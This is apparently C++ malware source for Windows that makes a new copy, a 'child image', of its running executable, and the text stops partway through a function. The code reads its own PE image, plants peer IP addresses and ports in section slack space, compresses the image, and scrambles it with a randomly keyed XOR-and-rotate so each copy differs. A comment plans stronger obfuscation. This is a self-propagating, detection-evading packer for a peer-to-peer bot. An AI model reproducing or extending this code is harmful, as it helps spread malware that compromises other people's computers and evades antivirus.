#include <winsock2.h>
#include "childimage.h"

#define OFFSETBITS 11
#define LENGTHBITS 3
#define OFFSETSIZE 2048
#define LENGTHSIZE 8

VOID PutBits(UCHAR BitsToWrite, BYTE Input,  PBYTE BitBuffer, PUINT ByteOffset, PINT BitOffset){
	BYTE TempByte = Input;
	TempByte <<= (*BitOffset);
	BitBuffer[*ByteOffset] |= TempByte;
	INT OldBitOffset = (*BitOffset);
	(*BitOffset) += BitsToWrite;
	if(*BitOffset >= 8){
		(*ByteOffset)++;
		(*BitOffset) -= 8;
		if((*BitOffset)){
			TempByte = Input;
			TempByte >>= (8 - OldBitOffset);
			BitBuffer[*ByteOffset] = TempByte;
		//dprintf(" %d  %d %.2X->%.2X  %d\r\n", BitsToWrite, (*BitOffset), Input, TempByte, OldBitOffset);
		}
	}
}

BYTE GetBits(UCHAR BitsToRead, PBYTE BitBuffer, PUINT ByteOffset, PINT BitOffset){
	CHAR BitsToReadL = ((BitsToRead + (*BitOffset)) > 8 ? (8 - (*BitOffset)) : BitsToRead);
	CHAR ShiftLeft = (8 - (*BitOffset)) - BitsToReadL;
	CHAR ShiftRight = (8 - BitsToReadL);
	BYTE Return = (BYTE)(BitBuffer[(*ByteOffset)] << ShiftLeft) >> ShiftRight;
	//dprintf("%d BitsToRead = %d, BitOffset = %d, ShiftLeft = %d, ShiftRight = %d\r\n", (*ByteOffset), BitsToReadL, (*BitOffset), ShiftLeft, ShiftRight);
	if(BitsToRead + (*BitOffset) >= 8){
		(*ByteOffset)++;
		CHAR BitsToReadH = BitsToRead - BitsToReadL;
		ShiftLeft = (8 - BitsToReadH);
		ShiftRight = (8 - BitsToRead);
		BYTE ReturnH = (BYTE)(BitBuffer[(*ByteOffset)] << ShiftLeft) >> ShiftRight;
		//dprintf("%.2X %.2X\r\n", Return, ReturnH);
		Return |= ReturnH;
		//dprintf("%d BitsToRead = %d, BitOffset = %d, ShiftLeft = %d, ShiftRight = %d\r\n", (*ByteOffset), BitsToReadH, 0, ShiftLeft, ShiftRight);
		(*BitOffset) = BitsToReadH;
	}else{
		(*BitOffset) += BitsToRead;
	}
	return Return;
}

VOID SeekBits(INT BitsToSeek, PUINT ByteOffset, PINT BitOffset){
	(*BitOffset) += BitsToSeek;
	(*ByteOffset) += ((*BitOffset) / 8);
	//dprintf("+= (%d)%d, %d\r\n", (*BitOffset), ((*BitOffset) / 8), (*BitOffset) % 8);
	(*BitOffset) %= 8;
}

/*class DictionaryTreeNode
{
public:
	DictionaryTreeNode* Node[256];
	DictionaryTreeNode(){
		memset(Node, NULL, sizeof(Node));
	}
	~DictionaryTreeNode(){
		for(UINT i = 0; i <= 0xFF; i++){
			if(Node[i]){
				delete Node[i];
				Node[i] = NULL;
			}
		}
	}
	UINT DictionaryOffset;
};*/

class Dictionary
{
private:
	//DictionaryTreeNode HeadNode;
	PBYTE DictionaryBuffer;
	UINT DictionaryOffset;
	UINT DictionarySize;

public:
	Dictionary(UINT Size){
		DictionarySize = Size;
		DictionaryBuffer = new BYTE[Size];
		memset(DictionaryBuffer, 0x00, Size);
		for(UINT i = 0; i < 0x100; i++)
			DictionaryBuffer[i] = i;
		DictionaryOffset = 0x100;
	}

	~Dictionary(){
		delete[] DictionaryBuffer;
		/*for(UINT i = 0; i <= 0xFF; i++){
			if(HeadNode.Node[i]){
				delete HeadNode.Node[i];
				HeadNode.Node[i] = NULL;
			}
		}*/
	}

/*	BOOL Full(VOID){
		return !(DictionaryOffset < DictionarySize);
	}

	VOID Search(PBYTE Bytes, PUINT Length, PUINT Offset){
		//dprintf("%.2X ", Bytes[0]);
		DictionaryTreeNode* TempNode = &HeadNode;
		DictionaryTreeNode* OldTempNode;
		UINT MatchLength = 0;
		for(UINT i = 0; i < (*Length); i++){
			OldTempNode = TempNode;
			TempNode = TempNode->Node[Bytes[i]];
			if(!TempNode)
				break;
			else
				MatchLength++;
			//dprintf("%.2X", Bytes[i]);
		}
		//dprintf("  ");
		(*Offset) = OldTempNode->DictionaryOffset - MatchLength + 1;
		(*Length) = MatchLength;
	}

	DictionaryTreeNode* Insert(PBYTE Bytes, UINT Length){ // This will insert the byte stream into the dictionary as well
		DictionaryTreeNode* TempNode = &HeadNode;		  // as create a path down the byte tree
		//dprintf("inserting ");
		for(UINT i = 0; i < Length; i++){
			//dprintf("%.2X", Bytes[i]);
			if(!Full()){
				if(!TempNode->Node[Bytes[i]]){
					TempNode->Node[Bytes[i]] = new DictionaryTreeNode;
					TempNode->Node[Bytes[i]]->DictionaryOffset = DictionaryOffset;
				}
				Dictionary[DictionaryOffset] = Bytes[i];
				DictionaryOffset++;
			}else
				break;
			TempNode = TempNode->Node[Bytes[i]];
		}
		//dprintf("  ");
		return TempNode;
	}

	VOID BuildMore(UINT Length){		 // Creates more paths in the byte tree to follow using the existing dictionary, based on
		if(DictionaryOffset < Length) // random numbers.  Calling this more will provide better compression but will use up a 
			return;				 // lot of memory and will get slower as it is creating a lot of branches, actually this method 
								// was a waste of time and doesnt work very well at all
		UINT Start = rand_r(0, (DictionaryOffset - Length));
		DictionaryTreeNode* TempNode = HeadNode.Node[Dictionary[Start]];
		if(!TempNode)
			return;
		UINT Enum = rand_r(0, Length);
		for(UINT i = 0; i < Enum; i++){
			if(TempNode->Node[Dictionary[Start + i]] && TempNode->Node[Dictionary[Start + i]]->Node[Dictionary[Start + i + 1]])
				TempNode = TempNode->Node[Dictionary[Start + i]];
		}
		for(UINT i = Start + 1; i < (Start + Length); i++){
			//dprintf("%.2X", Dictionary[i]);
			if(!TempNode->Node[Dictionary[i]]){
				TempNode->Node[Dictionary[i]] = new DictionaryTreeNode;
				TempNode->Node[Dictionary[i]]->DictionaryOffset = i;
				//dprintf(".%d;", i);
			}
			TempNode = TempNode->Node[Dictionary[i]];
		}
		//dprintf("  ");
	}*/

	UINT Search(PBYTE Bytes, PUINT Length){
		UINT MatchOffset = 0;
		UINT MatchLength = 0;
		for(UINT i = 0; i < OFFSETSIZE - LENGTHSIZE; i++){
			if(DictionaryBuffer[i] == Bytes[0]){
				UINT TempMatchLength = 1;
				for(UINT j = 1; j < (*Length); j++){
					if(DictionaryBuffer[(i + j) % OFFSETSIZE] == Bytes[j])
						TempMatchLength++;
					else
						break;
				}
				if(TempMatchLength > MatchLength){
					MatchLength = TempMatchLength;
					MatchOffset = i;
				}
			}
		}
		(*Length) = MatchLength;
		return MatchOffset;
	}

	VOID Insert(PBYTE Bytes, UINT Length){
		for(UINT i = 0; i < Length; i++){
			//if(DictionaryOffset >= OFFSETSIZE)
			//	dprintf("%d\r\n", DictionaryOffset);
			DictionaryBuffer[DictionaryOffset] = Bytes[i];
			DictionaryOffset++;
			if(DictionaryOffset >= OFFSETSIZE)
				DictionaryOffset = 0x100;
			//dprintf("%.2X %d %.2X\r\n", Bytes[i], DictionaryOffset, Dictionary[i]);
		}
	}
};

/*VOID Decompress(VOID){
	BYTE Dictionary[OFFSETSIZE];
	memset(Dictionary, 0, sizeof(Dictionary));
	for(UINT i = 0; i < 0x100; i++)
		Dictionary[i] = i;
	UINT DictionaryOffset = 0x100;
	PBYTE Output = new BYTE[700000];
	memset(Output, 0, 700000);
	UINT OutputOffset = 0;
	File InputFile("C:\\sandbox\\snus3\\out.exe");
	PBYTE Buffer = new BYTE[InputFile.GetSize()];
	InputFile.Read(Buffer, InputFile.GetSize());
	UINT ByteOffset = 0;
	INT BitOffset = 0;
	UINT TotalSize = 0;

	while(TotalSize < InputFile.GetSize()){
		BYTE OffsetL = NULL, OffsetH = NULL;
		WORD Offset = NULL;
		OffsetL = GetBits(8, Buffer, &ByteOffset, &BitOffset);
		OffsetH = GetBits(OFFSETBITS - 8, Buffer, &ByteOffset, &BitOffset);
		Offset = MAKEWORD(OffsetL, OffsetH);
		BYTE Length = GetBits(LENGTHBITS, Buffer, &ByteOffset, &BitOffset);

		//dprintf("%.3X:%.3X %d\t", OutputOffset, Offset, Length);

		if(Length == 0)
			Length = LENGTHSIZE;

		UINT OldOutputOffset = OutputOffset;
		for(UINT i = 0; i < Length; i++)
			Output[OutputOffset++] = Dictionary[Offset + i];
		for(UINT i = 0; i < Length; i++){
			Dictionary[DictionaryOffset++] = Output[OldOutputOffset + i];
			if(DictionaryOffset == OFFSETSIZE)
				DictionaryOffset = 0x100;
		}

		TotalSize += Length;
	}


	PBYTE Original = new BYTE[700000];
	memset(Original, 0, 700000);
	CHAR Name[MAX_PATH];
	strcpy(Name, "C:\\sandbox\\snus3\\Debug\\snus3o.exe");
	File PeeFile(Name);
	PeeFile.SetPointer(FILE_BEGIN, 0x1000);
	PeeFile.Read(Original, PeeFile.GetSize());
	dprintf("%d\r\n", PeeFile.GetSize());
	for(UINT i = 0; i < 350000; i++){
		if(Output[i] != Original[i])
			dprintf("%d %x %x %x\r\n", i, Output[i], Original[i], Buffer[i]);
	}
	delete[] Original;
	delete[] Buffer;
	delete[] Output;
}*/

DWORD LoadImage(PBYTE* OutBuffer, BOOL Compressed){
	DWORD FileSize;
	PBYTE Buffer = NULL;
	if(!Compressed){
		CHAR Name[MAX_PATH];
		GetModuleFileName(NULL, Name, sizeof(Name));
		::File Image;
		Image.Open(Name, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL);
		FileSize = Image.GetSize();
		Buffer = new BYTE[FileSize];
		*OutBuffer = Buffer;
		Image.Read(Buffer, FileSize);
		Image.Close();
		return FileSize;
	}

	HANDLE Process = GetCurrentProcess();
	LPCVOID BaseAddress = GetModuleHandle(NULL);
	PBYTE CurrentPosition = (PBYTE)BaseAddress;
	SIZE_T BytesRead;
	IMAGE_DOS_HEADER DosHeader;
	IMAGE_NT_HEADERS NtHeaders;
	IMAGE_NT_HEADERS* NtHeadersPtr;
	ReadProcessMemory(Process, (LPCVOID)CurrentPosition, &DosHeader, sizeof(DosHeader), &BytesRead);
	if(DosHeader.e_magic != IMAGE_DOS_SIGNATURE)
		return 0;
	CurrentPosition += DosHeader.e_lfanew;
	ReadProcessMemory(Process, (LPCVOID)CurrentPosition, &NtHeaders, sizeof(NtHeaders), &BytesRead);
	if(NtHeaders.Signature != IMAGE_NT_SIGNATURE)
		return 0;
	CurrentPosition += sizeof(NtHeaders);
	FileSize = NtHeaders.OptionalHeader.SizeOfHeaders;
	//dprintf("%d Sections\r\nFileAlignment %X\r\n", NtHeaders.FileHeader.NumberOfSections, NtHeaders.OptionalHeader.FileAlignment);
	IMAGE_SECTION_HEADER* Section = new IMAGE_SECTION_HEADER[NtHeaders.FileHeader.NumberOfSections];
	for(UINT i = 0; i < NtHeaders.FileHeader.NumberOfSections; i++){
		ReadProcessMemory(Process, (LPCVOID)CurrentPosition, &Section[i], sizeof(IMAGE_SECTION_HEADER), &BytesRead);
		FileSize += Section[i].SizeOfRawData;
		CurrentPosition += sizeof(IMAGE_SECTION_HEADER);
	}

	//DWORD TestAddress = (DWORD)BaseAddress;
	MEMORY_BASIC_INFORMATION MemInfo;

	//instead of virtualquery to find compressed data store it in pe header somewhere
	// done
	/*for(UINT i = 0; i < 4; i++){
		VirtualQuery((LPCVOID)TestAddress, &MemInfo, sizeof(MemInfo));
		TestAddress += MemInfo.RegionSize;
	}*/
	//dprintf("%d\r\n", NtHeaders.FileHeader.NumberOfSections);

	PBYTE VarPointer = CurrentPosition;
	PDWORD VarPointerD = (PDWORD)VarPointer;
	MemInfo.BaseAddress = PVOID((DWORD)BaseAddress + *VarPointerD);
	VarPointerD++;
	MemInfo.RegionSize = (DWORD)*VarPointerD;

	//dprintf("%X %X %X\r\n", MemInfo.BaseAddress, MemInfo.RegionSize, *VarPointerD);
	PBYTE CompressedBuffer = new BYTE[MemInfo.RegionSize];
	Buffer = new BYTE[FileSize + 100]; // access violage after normal block error so increasing size dont know where the error is
	memset(Buffer, 0, FileSize);
	*OutBuffer = Buffer;
	DWORD OldProtect;
	VirtualProtect((LPVOID)BaseAddress, NtHeaders.OptionalHeader.SizeOfHeaders, PAGE_READWRITE, &OldProtect);
	ReadProcessMemory(Process, BaseAddress, Buffer, NtHeaders.OptionalHeader.SizeOfHeaders, &BytesRead);
	VirtualProtect((LPVOID)MemInfo.BaseAddress, MemInfo.RegionSize, PAGE_READWRITE, &OldProtect);
	ReadProcessMemory(Process, (LPCVOID)MemInfo.BaseAddress, CompressedBuffer, MemInfo.RegionSize, &BytesRead);

	BYTE Rotated = NtHeaders.OptionalHeader.MinorImageVersion >> 8;
	BYTE Xored = NtHeaders.OptionalHeader.MinorImageVersion;
	//dprintf("fart\r\n");

	for(UINT i = 0; i < MemInfo.RegionSize; i++){
		__asm{
			mov eax, CompressedBuffer
			mov ebx, i
			add ebx, eax
			mov al, BYTE PTR [ebx]
			mov cl, Rotated
			ror al, cl
			xor al, Xored
			mov BYTE PTR [ebx], al
		}
	}
	//dprintf("%d %d\r\n", NtHeaders.OptionalHeader.SizeOfHeaders, MemInfo.RegionSize);

	BYTE Dictionary[OFFSETSIZE];
	memset(Dictionary, 0, sizeof(Dictionary));
	for(UINT i = 0; i < 0x100; i++)
		Dictionary[i] = i;
	UINT DictionaryOffset = 0x100;
	memset(Buffer + NtHeaders.OptionalHeader.SizeOfHeaders, 0, MemInfo.RegionSize);
	UINT OutputOffset = NtHeaders.OptionalHeader.SizeOfHeaders;
	UINT ByteOffset = 0;
	INT BitOffset = 0;
	UINT TotalSize = 0;

	//dprintf("sdfsdfsdf\r\n");

	//dprintf("sadfsf = %d\r\n", FileSize - NtHeaders.OptionalHeader.SizeOfHeaders);

	while(TotalSize < FileSize - NtHeaders.OptionalHeader.SizeOfHeaders){
		BYTE OffsetL = NULL, OffsetH = NULL;
		WORD Offset = NULL;
		OffsetL = GetBits(8, CompressedBuffer, &ByteOffset, &BitOffset);
		OffsetH = GetBits(OFFSETBITS - 8, CompressedBuffer, &ByteOffset, &BitOffset);
		Offset = MAKEWORD(OffsetL, OffsetH);
		BYTE Length = GetBits(LENGTHBITS, CompressedBuffer, &ByteOffset, &BitOffset);

		if(Length == 0)
			Length = LENGTHSIZE;

		UINT OldOutputOffset = OutputOffset;
		for(UINT i = 0; i < Length; i++)
			Buffer[OutputOffset++] = Dictionary[Offset + i];
		for(UINT i = 0; i < Length; i++){
			Dictionary[DictionaryOffset++] = Buffer[OldOutputOffset + i];
			if(DictionaryOffset == OFFSETSIZE)
				DictionaryOffset = 0x100;
		}

		TotalSize += Length;
	}

	delete[] CompressedBuffer;


	/*NtHeadersPtr = (IMAGE_NT_HEADERS*)(Buffer + DosHeader.e_lfanew);
	for(UINT i = 0; i < NtHeaders.FileHeader.NumberOfSections; i++){
		DWORD OldProtect;
		VirtualProtect(Buffer + Section[i].PointerToRawData, Section[i].SizeOfRawData, PAGE_EXECUTE_READWRITE, &OldProtect);
		ReadProcessMemory(Process, (LPCVOID)((DWORD)BaseAddress + Section[i].VirtualAddress), Buffer + Section[i].PointerToRawData, Section[i].SizeOfRawData, &BytesRead);
	}*/
	delete[] Section;


/*	PCHAR ImportNameDLL;
	PCHAR ImportNameFunc;
	IMAGE_THUNK_DATA* ThunkData;
	IMAGE_THUNK_DATA* ThunkData2;
	IMAGE_THUNK_DATA ZeroThunkData;
	memset(&ZeroThunkData, NULL, sizeof(ZeroThunkData));
	IMAGE_IMPORT_DESCRIPTOR* ImportDescriptor = (IMAGE_IMPORT_DESCRIPTOR*)(Buffer + RvaToVa(NtHeadersPtr, NtHeaders.OptionalHeader.DataDirectory[1].VirtualAddress));
	IMAGE_IMPORT_DESCRIPTOR ZeroImportDescriptor;
	memset(&ZeroImportDescriptor, NULL, sizeof(ZeroImportDescriptor));
	while(memcmp(ImportDescriptor, &ZeroImportDescriptor, sizeof(IMAGE_IMPORT_DESCRIPTOR))){
		ImportDescriptor->FirstThunk = ImportDescriptor->OriginalFirstThunk;
		dprintf("%s %X -> %X\r\n", Buffer + RvaToVa(NtHeadersPtr, ImportDescriptor->Name), ImportDescriptor->FirstThunk, ImportDescriptor->OriginalFirstThunk);
		ThunkData = (IMAGE_THUNK_DATA*)(Buffer + RvaToVa(NtHeadersPtr, ImportDescriptor->OriginalFirstThunk));
		ThunkData2 = (IMAGE_THUNK_DATA*)(Buffer + RvaToVa(NtHeadersPtr, ImportDescriptor->FirstThunk));
		do{
			ThunkData2 = ThunkData;
			ThunkData++;
			ThunkData2++;
		}while(memcmp(ThunkData, &ZeroThunkData, sizeof(IMAGE_THUNK_DATA)));
		ImportDescriptor++;
	}*/

	return FileSize;
}

DWORD Compress(PBYTE* OutputBuffer, PBYTE Buffer, DWORD FileSize, HANDLE* Heap){
	/*CHAR Name[MAX_PATH];
	GetModuleFileName(NULL, Name, sizeof(Name));
	strcpy(Name, "C:\\sandbox\\snus3\\Release\\test.exe");
	::File F;
	F.Open(Name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL);
	DWORD FileSize = F.GetSize();
	PBYTE Buffer = new BYTE[FileSize];
	F.Read(Buffer, FileSize);*/
	//PBYTE Buffer;
	//DWORD FileSize = LoadImage(&Buffer, Compressed);
	//::File F("out.img");
	//F.Write(Buffer, FileSize);
	//F.Close;

	//for(UINT i = 0; i < 0x2000; i++)
	//	dprintf("%.2X", Buffer[i]);
	#define MAX_OUTPUT_SIZE (FileSize + 100000)


	UINT ByteOffset = 0;
	INT BitOffset = 0;
	Dictionary Dictionary(OFFSETSIZE);
	UINT TotalSize = 0;
	UINT MatchLength = 0;
	UINT MatchOffset = 0;
	*Heap = HeapCreate(NULL, MAX_OUTPUT_SIZE, 0);
	PBYTE Output = (PBYTE)HeapAlloc(*Heap, HEAP_ZERO_MEMORY, MAX_OUTPUT_SIZE);
	*OutputBuffer = Output;
	UINT ByteOffset2 = 0;
	INT BitOffset2 = 0;



	//dprintf("\r\nFileSize = %d\r\n", FileSize);

	IMAGE_DOS_HEADER* DosHeader;
	IMAGE_NT_HEADERS* NtHeaders;
	DosHeader = (IMAGE_DOS_HEADER*)Buffer;
	NtHeaders = (IMAGE_NT_HEADERS*)(Buffer + DosHeader->e_lfanew);

	ByteOffset += NtHeaders->OptionalHeader.SizeOfHeaders;
	FileSize -= NtHeaders->OptionalHeader.SizeOfHeaders;

	//UINT Lengths[LENGTHSIZE];
	//memset(Lengths, 0, sizeof(Lengths));
	//UINT Total = 0;
	while(TotalSize < FileSize){
		BYTE SearchBytes[LENGTHSIZE];
		for(UINT i = 0; i < LENGTHSIZE; i++)
			SearchBytes[i] = GetBits(8, Buffer, &ByteOffset, &BitOffset);
		SeekBits(LENGTHSIZE * -8, &ByteOffset, &BitOffset);
		MatchLength = LENGTHSIZE;
		MatchOffset = Dictionary.Search(SearchBytes, &MatchLength);

		PutBits(8, LOBYTE(MatchOffset), Output, &ByteOffset2, &BitOffset2);
		PutBits(OFFSETBITS - 8, HIBYTE(MatchOffset), Output, &ByteOffset2, &BitOffset2);
		PutBits(LENGTHBITS, MatchLength == LENGTHSIZE ? 0 : MatchLength, Output, &ByteOffset2, &BitOffset2);
		Dictionary.Insert(SearchBytes, MatchLength);
		TotalSize += MatchLength;
		SeekBits(MatchLength * 8, &ByteOffset, &BitOffset);
		//Lengths[MatchLength == LENGTHSIZE ? 0 : MatchLength]++;
		//Total++;

		//if(TotalSize < 1000)
			//dprintf("%.3X:%.3X %d\t", TotalSize, MatchOffset, MatchLength);
		/*if(MatchLength >= 3){
			SeekBits(MatchLength * -8, &ByteOffset, &BitOffset);
			PutBits(1, 1, Output, &ByteOffset2, &BitOffset2);
			if(OFFSETBITS == 16){
				PutBits(8, LOBYTE(MatchOffset), Output, &ByteOffset2, &BitOffset2);
				PutBits(8, HIBYTE(MatchOffset), Output, &ByteOffset2, &BitOffset2);
			}else
				PutBits(OFFSETBITS, MatchOffset, Output, &ByteOffset2, &BitOffset2);
			PutBits(LENGTHBITS, MatchLength, Output, &ByteOffset2, &BitOffset2);
			SeekBits(MatchLength * 8, &ByteOffset, &BitOffset);
			BYTE Bytes[LENGTHSIZE];
			for(UINT i = 0; i < MatchLength; i++){
				Bytes[i] = GetBits(8, Buffer, &ByteOffset, &BitOffset);
			}
			Dictionary.Insert(Bytes, MatchLength);
			//Dictionary.InsertNormal(Bytes, MatchLength);
			TotalSize += MatchLength;
		}else{
			BYTE Byte = GetBits(8, Buffer, &ByteOffset, &BitOffset);
			PutBits(1, 0, Output, &ByteOffset2, &BitOffset2);
			PutBits(8, Byte, Output, &ByteOffset2, &BitOffset2);
			Dictionary.Insert(&Byte, 1);
			//Dictionary.InsertNormal(&Byte, 1);
			TotalSize++;
			Dictionary.BuildMore(4);
		}*/
	}
	//for(UINT i = 0; i < LENGTHSIZE; i++){
	//	dprintf("%d %d  %f\r\n", i, Lengths[i], FLOAT(Lengths[i])/Total);
	//}
//dprintf("\r\n\r\n%d -> %d  %d\r\n", TotalSize, ByteOffset2, FileSize);
//dprintf("\r\n");

return ByteOffset2;
}

VOID EmbedLinks(PBYTE Image){
	UINT LinkIndex = 0;
	BOOL LinksExist = FALSE;

	for(UINT i = 0; i < LinkCache::GetLinkCount(); i++){
		LinkCache::Link Link = LinkCache::GetNextLink(&LinkIndex);
		if(!Link.Permanent)
			LinksExist = TRUE;
		LinkIndex++;
	}

	if(!LinksExist)
		return;

	SIZE_T BytesRead;
	IMAGE_DOS_HEADER* DosHeader;
	IMAGE_NT_HEADERS* NtHeaders;
	DosHeader = (IMAGE_DOS_HEADER*)Image;
	NtHeaders = (IMAGE_NT_HEADERS*)(Image + DosHeader->e_lfanew);

	if(NtHeaders->Signature != IMAGE_NT_SIGNATURE)
		return;

	IMAGE_SECTION_HEADER* Section = (IMAGE_SECTION_HEADER*)((PCHAR)NtHeaders + sizeof(IMAGE_NT_HEADERS));

	for(UINT i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++){
		if(Section->SizeOfRawData > Section->Misc.VirtualSize){
			//memset(Image + Section->PointerToRawData + Section->Misc.VirtualSize, NULL, Section->SizeOfRawData - Section->Misc.VirtualSize);
			LONG Addr;
			USHORT Port;
			for(DWORD Temp = Section->PointerToRawData + Section->SizeOfRawData - (Section->SizeOfRawData - Section->Misc.VirtualSize); Temp < Section->PointerToRawData + Section->SizeOfRawData - sizeof(Addr) - sizeof(Port); Temp += sizeof(Addr) + sizeof(Port)){
				LinkCache::Link Link;
				do
					Link = LinkCache::GetRandomLink();
				while(Link.Permanent);
				Addr = inet_addr(Link.Hostname);
				Port = Link.Port;
				memcpy(Image + Temp, &Addr, sizeof(Addr));
				memcpy(Image + Temp + sizeof(Addr), &Port, sizeof(Port));
			}
		}
		Section++;
	}
}

VOID LoadEmbeddedLinks(VOID){
	HANDLE Process = GetCurrentProcess();
	LPCVOID BaseAddress = GetModuleHandle(NULL);
	PBYTE CurrentPosition = (PBYTE)BaseAddress;
	SIZE_T BytesRead;
	IMAGE_DOS_HEADER DosHeader;
	IMAGE_NT_HEADERS NtHeaders;
	ReadProcessMemory(Process, (LPCVOID)CurrentPosition, &DosHeader, sizeof(DosHeader), &BytesRead);
	if(DosHeader.e_magic != IMAGE_DOS_SIGNATURE)
		return;
	CurrentPosition += DosHeader.e_lfanew;
	ReadProcessMemory(Process, (LPCVOID)CurrentPosition, &NtHeaders, sizeof(NtHeaders), &BytesRead);
	if(NtHeaders.Signature != IMAGE_NT_SIGNATURE)
		return;
	CurrentPosition += sizeof(NtHeaders);
	//dprintf("%d Sections\r\nFileAlignment %X\r\n", NtHeaders.FileHeader.NumberOfSections, NtHeaders.OptionalHeader.FileAlignment);
	IMAGE_SECTION_HEADER* Section = new IMAGE_SECTION_HEADER[NtHeaders.FileHeader.NumberOfSections];
	PBYTE Temp = new BYTE[NtHeaders.OptionalHeader.FileAlignment];
	for(UINT i = 0; i < NtHeaders.FileHeader.NumberOfSections; i++){
		ReadProcessMemory(Process, (LPCVOID)CurrentPosition, &Section[i], sizeof(IMAGE_SECTION_HEADER), &BytesRead);
			/*CHAR FileName[256];
			sprintf(FileName, "Section%d.bin", i);
			File File(FileName);
			File.Write((PBYTE)&Section[i], BytesRead);
			File.Close();*/
		if(Section[i].SizeOfRawData > Section[i].Misc.VirtualSize){
			memset(Temp, NULL, sizeof(Temp));
			ReadProcessMemory(Process, (LPCVOID)((PBYTE)BaseAddress + Section[i].VirtualAddress + Section[i].Misc.VirtualSize), Temp, Section[i].SizeOfRawData - Section[i].Misc.VirtualSize, &BytesRead);
			//dprintf("%d\r\n", BytesRead);
			UINT TempOffset = 0;
			while(Temp[TempOffset] && TempOffset < NtHeaders.OptionalHeader.FileAlignment){
				ULONG Addr = 0;
				USHORT Port = 0;
				memcpy(&Addr, &Temp[TempOffset], sizeof(Addr));
				memcpy(&Port, &Temp[TempOffset + sizeof(Addr)], sizeof(Port));
				CHAR Encoded[256];
				LinkCache::EncodeName(Encoded, sizeof(Encoded), inet_ntoa(SocketFunction::Stoin(Addr)), Port);
				LinkCache::AddLink(Encoded);
				TempOffset += sizeof(Addr) + sizeof(Port);
			}
		}
		CurrentPosition += sizeof(IMAGE_SECTION_HEADER);
	}
	delete[] Temp;
	delete[] Section;
}

inline VOID WriteLittleEndian(PBYTE Buffer, PBYTE Opcode, DWORD Length){
	for(UINT i = Length; i > 0; --i, Buffer[i] = Opcode[i]);
}

inline VOID WriteBigEndian(PBYTE Buffer, const BYTE* Opcode, DWORD Length){
	for(UINT i = 0; i < Length; Buffer[i] = Opcode[i], i++);
}

// this can take being fixed up more it works with most executes like the one being compiled but fails on weird ones such as notepad.exe
// the problem now is that the unpacked data gets written to later when it runs so it reads it wrong and the grandchild image wont run
// actually that problem was circumvated by loading the image from the compressed section and a separate routine for the uncompressed image
DWORD CreateChildImage(PBYTE* ImageBuffer, BOOL Compressed){
	PBYTE CompressedBuffer = NULL;
	PBYTE Buffer = NULL;
	DWORD FileSize = LoadImage(&Buffer, Compressed); //
	EmbedLinks(Buffer);

	//dunno why but if you add Sleep(100) here it sometimes no longer gets a debug error on the child image must investigate
	//figured out, the heap reserve was too low
	*ImageBuffer = Buffer;
	HANDLE Heap;
	DWORD CompressedBufferSize = Compress(&CompressedBuffer, Buffer, FileSize, &Heap); //
	DWORD CompressedBufferSizeAligned = 0;
	BYTE Rotated = rand_r(0, 7);
	BYTE Xored = rand_r(0, 0xFF);

	// todo: make the xor + rol obscurity better with a fibonanci-like routine

	for(UINT i = 0; i < CompressedBufferSize; i++){
		__asm{
			mov eax, CompressedBuffer
			mov ebx, i
			add ebx, eax
			mov al, BYTE PTR [ebx]
			mov cl, Rotated
			xor al, Xored
			rol al, cl
			mov BYTE PTR [ebx], al
		}
	}
	//File L("output.bin");
	//L.Write(CompressedBuffer, CompressedBufferSize);
	//L.Close();
	#define STUB_SIZE 0x1000
	/*CHAR Name[MAX_PATH];
	GetModuleFileName(NULL, Name, sizeof(Name));
	strcpy(Name, "C:\\sandbox\\snus3\\Release\\test.exe");
	::File F;
	F.Open(Name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL);
	PBYTE Buffer = new BYTE[F.GetSize() + 100000];
	*ImageBuffer = Buffer;
	F.Read(Buffer, F.GetSize());*/
	DWORD OutputFileSize = 0;

	IMAGE_DOS_HEADER* DosHeader = (IMAGE_DOS_HEADER*)Buffer;
	if(DosHeader->e_magic == IMAGE_DOS_SIGNATURE){
		IMAGE_NT_HEADERS* NtHeaders = (IMAGE_NT_HEADERS*)(Buffer + DosHeader->e_lfanew);
		IMAGE_NT_HEADERS OriginalNtHeaders;
		memcpy(&OriginalNtHeaders, NtHeaders, sizeof(IMAGE_NT_HEADERS));
		if(NtHeaders->Signature == IMAGE_NT_SIGNATURE){
			PCHAR End = (PCHAR)NtHeaders + sizeof(IMAGE_NT_HEADERS);
			IMAGE_SECTION_HEADER* Section = (IMAGE_SECTION_HEADER*)(End);
			IMAGE_SECTION_HEADER OriginalSection[8];

			DWORD StubAddress = 0;
			LPCVOID BaseAddress = (LPCVOID)NtHeaders->OptionalHeader.ImageBase;
			UINT Total = 0;
			//PCHAR Sections[12];
			for(UINT i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++){
				memcpy(&OriginalSection[i], Section, sizeof(IMAGE_SECTION_HEADER));
				//dprintf("%s %X(%X) %X %X\r\n", Section->Name, Section->SizeOfRawData, Section->Misc.VirtualSize, Section->PointerToRawData, Section->VirtualAddress);

				if(Section->VirtualAddress + Section->SizeOfRawData > StubAddress){
					StubAddress = Section->VirtualAddress + Section->Misc.VirtualSize;
				}
				//for(UINT i = Section->Misc.VirtualSize; i < Section->SizeOfRawData; i+= strlen("fart")){
				//	if((Section->SizeOfRawData - i) > strlen("fart")){
				//		strcpy(PCHAR(Buffer + Section->PointerToRawData + i), "fart");
				//		Total += strlen("fart");
				//	}
				//}
				//Sections[i] = new CHAR[Section->SizeOfRawData];
				//memcpy(Sections[i], (Buffer + Section->PointerToRawData), Section->SizeOfRawData);
				Section++;
			}
			while(StubAddress % NtHeaders->OptionalHeader.SectionAlignment){
				//dprintf("   %X\r\n", StubAddress % NtHeaders->OptionalHeader.SectionAlignment);
				StubAddress++;
			}

			//NtHeaders->OptionalHeader.SectionAlignment = 0x200;
			//NtHeaders->OptionalHeader.SizeOfHeaders = 0x1000;

			//dprintf("Section alignment %X\r\n", NtHeaders->OptionalHeader.SectionAlignment);

			UINT i = 0;
			for(i = 0; i < CompressedBufferSize; i += NtHeaders->OptionalHeader.SectionAlignment);
			CompressedBufferSizeAligned = i;

			OutputFileSize = NtHeaders->OptionalHeader.SizeOfHeaders + CompressedBufferSizeAligned + STUB_SIZE;

